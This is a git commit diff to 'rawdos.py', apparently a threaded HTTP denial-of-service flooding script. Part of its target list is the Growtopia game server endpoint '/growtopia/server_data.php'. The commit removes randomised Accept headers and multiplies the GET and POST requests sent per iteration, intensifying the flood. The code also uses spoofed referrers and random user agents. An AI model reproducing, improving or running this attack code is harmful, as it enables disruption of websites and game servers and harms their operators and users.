5fa286450fefca2036ee19b05126c817c7121859
PhynX <48216256+PhynX404@users.noreply.github.com>
2021-11-28 18:24:25 +0700

    Update rawdos.py

--- rawdos.py
+++ rawdos.py
@@ -144,23 +144,6 @@ ref = ['http://help.baidu.com/searchResult?keywords=',
 'http://eu.battle.net/wow/en/search?q=',
 'https://growtopiagame.com']
 
-acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-"Accept-Encoding: gzip, deflate\r\n",
-"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
-"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
-"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
-"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-"Accept: text/html, application/xhtml+xml",
-"Accept-Language: en-US,en;q=0.5\r\n",
-"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-"Accept: application/x-www-form-urlencoded"]
-
 class raw_dos(threading.Thread):
     def __init__(self, counter):
         threading.Thread.__init__(self)
@@ -172,7 +155,7 @@ class raw_dos(threading.Thread):
         "Cache-Control" : "max-age=0",
         "Upgrade-Insecure-Requests" : "1",
         "User-Agent" : random.choice(useragents),
-        "Accept" : random.choice(acceptall),
+        "Accept" : "application/x-www-form-urlencoded",
         "Referrer" : random.choice(ref),
         "Accept-Encoding" : "gzip, deflate",
         "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
@@ -180,7 +163,15 @@ class raw_dos(threading.Thread):
         method_attack = str(sys.argv[3])
         if method_attack == "1":
             requests.get(url, headers=headersx)
+            requests.get(url, headers=headersx)
+            requests.get(url, headers=headersx)
+            requests.get(url, headers=headersx)
+            requests.get(url, headers=headersx)
         else:
+            requests.post(url+"/growtopia/server_data.php", headers=headersx)
+            requests.post(url+"/growtopia/server_data.php", headers=headersx)
+            requests.post(url+"/growtopia/server_data.php", headers=headersx)
+            requests.post(url+"/growtopia/server_data.php", headers=headersx)
             requests.post(url+"/growtopia/server_data.php", headers=headersx)
         while True:
             try:
